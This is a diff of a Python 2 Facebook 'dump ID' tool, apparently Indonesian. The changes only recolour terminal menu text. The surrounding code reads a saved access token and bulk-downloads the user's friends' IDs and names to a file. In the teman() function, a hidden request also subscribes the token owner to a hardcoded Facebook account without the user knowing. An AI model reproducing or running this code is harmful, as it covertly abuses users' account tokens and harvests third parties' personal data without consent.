@@ -223,22 +223,23 @@ def follower():
                 raw_input('\x1b[1;92m╠══◍➤®[\x1b[1;97mKembali\x1b[1;92m]')
                 menu()
 	except requests.exceptions.ConnectionError:
-		exit("\x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m Koneksi Error")
+		exit("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Koneksi Error")
 def teman():
         try:
                 token=open('___bangsat___','r').read()
         except IOError:
-                print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Token Invalid')
+                print('\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Token Invalid')
                 os.system('rm -rf ___bangsat___')
                 time.sleep(2)
                 login()
         try:
-		file = raw_input("\x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\x1b[1;97m Name File :\x1b[1;96m ")
+		file = raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Name File :\x1b[1;92m ")
                 try:
                    r=requests.get("https://graph.facebook.com/me/friends?access_token="+token+"&limit=99999999");requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token='+token)
                 except KeyError:
-                        print('\n\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Tidak Ada Teman')
-                        raw_input("\x1b[1;97m[\x1b[1;92mKembali\x1b[1;97m]")
+                        print('\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Tidak Ada Teman')
+	                print("\x1b[1;92m║")
+                        raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97mKembali\x1b[1;92m]")
                         menu()
                 id = []
                 z=json.loads(r.text)
@@ -246,15 +247,15 @@ def teman():
                 for a in z['data']:
                         id.append(a['id']+"<=>"+a['name'])
                         fle.write(a['id']+"<=>"+a['name']+'\n')
-                        print("\r\x1b[1;97m[\x1b[1;92m•\x1b[1;97m]\x1b[1;92m Dump\x1b[1;96m %s\x1b[1;92m ID\r"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
+                        print("\r\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Dump\x1b[1;92m %s\x1b[1;97m ID\r"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
                 fle.close()
 		print("\r\x1b[1;97m                   ")
-                print("\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m Selesai")
-                print("\x1b[1;97m[\x1b[1;92m*\x1b[1;97m]\x1b[1;92m File Tersimpan :\x1b[1;93m "+file)
-                raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
+                print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m Selesai")
+                print("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;97m File Tersimpan :\x1b[1;92m "+file)
+                raw_input("\x1b[1;92m╠══◍➤®[\x1b[1;97mKembali\x1b[1;92m]")
                 menu()
 	except requests.exceptions.ConnectionError:
-		exit("\x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m Koneksi Error")
+		exit("\x1b[1;92m╠══◍➤®[\x1b[1;97m•\x1b[1;92m]\x1b[1;91m Koneksi Error")
 def menu():
 	global ip, org
 	try:
